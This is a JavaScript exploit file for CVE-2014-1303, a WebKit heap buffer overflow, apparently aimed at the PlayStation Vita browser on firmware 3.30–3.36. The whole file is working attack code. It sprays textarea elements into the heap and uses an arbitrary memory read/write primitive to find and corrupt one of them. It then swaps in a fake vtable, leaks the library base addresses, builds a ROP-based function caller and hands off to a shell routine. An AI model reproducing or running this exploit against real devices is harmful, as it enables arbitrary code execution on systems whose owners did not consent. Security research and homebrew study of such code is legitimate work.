/*
    [CVE-2014-1303] Apple Safari Heap Based Buffer Overflow
*/

function initMemoryHole()
{

	try {
		// Check Vita version for ROP offsets.
		var user_agent = navigator.userAgent;
		if (user_agent.indexOf("Vita 3.30") != -1) {
			version = "v3_30";
		} else if (user_agent.indexOf("Vita 3.35") != -1) {
			version = "v3_35";
		} else if (user_agent.indexOf("Vita 3.36") != -1) {
			version = "v3_36";
		} else {
			logdbg("Not Supported !");
			return -1;
		}
		
		logdbg("Initialization");
		textareas = new Array();

		/* 
			Spray memory with Element objects
		*/
		logdbg("Spraying Elements...");
		
		for (var i = 0; i < 0x2000; ++i) {
			var e = document.createElement("textarea");
			e.rows = 0x66656463;
			textareas.push(e);
		}
		
		logdbg("Done spraying");

		/*
			Find one of the sprayed Element objects in memory
			by looking for the rows of the object
		*/
		var found_element = false;
		var textarea_addr = 0;
		logdbg("Searching for Element signature...");
		for (var x = 0; x < 0x80000; ++x) {
			var addr = (0x85200000 / 4) + x;
			if (aspace32[addr] == 0x66656463) {
				logdbg("Changing textarea.rows at addr 0x" + (addr * 4).toString(16));
				aspace32[addr] = 0x55555555;
				textarea_addr = addr * 4;
				found_element = true;
				break;
			}
		}
		if (!found_element) {
			logdbg("Did not find Element signature");
			return -1;
		}

		/*
			Change the rows of the Element object then scan the array of
			sprayed objects to find an object whose rows have been changed
		*/
		var found_corrupted = false;
		var corrupted_textarea;
		logdbg("Searching for corrupted Element...");
		for (var i = 0; i < textareas.length; ++i) {
			if (textareas[i].rows == 0x55555555) {
				corrupted_textarea = textareas[i];
				logdbg("Found corrupted textarea at index #" + i);
				found_corrupted = true;
				break;
			}
		}
		if (!found_corrupted) {
			logdbg("Did not find corrupted textarea");
			return -1;
		}

		defineLibraryFuncs();
		defineOffsets();
		offsets = ver_offsets[version];

		var vtidx = textarea_addr + offsets.elementvtable_off;
		var textareavptr = aspace32[vtidx / 4];
		logdbg("Textarea vptr: 0x" + textareavptr.toString(16));

		var setscrollleftptr = aspace32[textareavptr / 4 + offsets.setscrollleft_idx];
		logdbg("WebCore::HTMLBodyElement::setScrollLeft is at 0x" + setscrollleftptr.toString(16));

		var scewkbase = setscrollleftptr - offsets.scewkbase_off;

		// We should have 0x20040 bytes of memory we can freely use.
		allocate_memory = init_memory(u32_base);

		var fkvtable = allocate_memory(0x100 * 4);
		logdbg("Fake vtable at: 0x" + fkvtable.toString(16));

		logdbg("Copying vtable...");
		for (var i = 0; i < 0x100; i++) {
			aspace32[(fkvtable + (i << 2))/ 4] = aspace32[(textareavptr + (i << 2)) / 4];
		}

		aspace32[(vtidx) / 4] = fkvtable;
		
		// Get SceLibc base
		var scelibcbase = get_base_from_offsets(scewkbase, offsets.scelibcentry_off, offsets.scelibcbase_off);
		
		// Get SceNet base
		var scenetbase = get_base_from_offsets(scewkbase, offsets.scelibnetentry_off, offsets.scelibnetbase_off);
			
		// Get SceKernel base
		var scekernbase = get_base_from_offsets(scewkbase, offsets.scekernentry_off, offsets.scekernbase_off);
		
		logdbg("-------------------------------------------------");
		logdbg("SceWebkit base: 0x" + scewkbase.toString(16));
		logdbg("SceLibc base: 0x" + scelibcbase.toString(16));
		logdbg("-------------------------------------------------");

		var bases = {
			"SceWebKit": scewkbase,
			"SceLibc": scelibcbase,
			"SceLibKernel":scekernbase
		};

		var tmpmem = allocate_memory(0x5000);
		caller = get_caller(tmpmem, corrupted_textarea, vtidx, fkvtable, version);
		libraries = init_ggts(bases, caller, version);

		var t = libraries.SceLibc.functions.time(0);
		logdbg("Time: " + t);
		
		logdbg("Exploit completed!\n");
		
		shell(aspace);

		return aspace;
	}
	catch(e) {
        logdbg("Error: " + e.line + " " + e);
        return -1;
    }

    return -1;
}
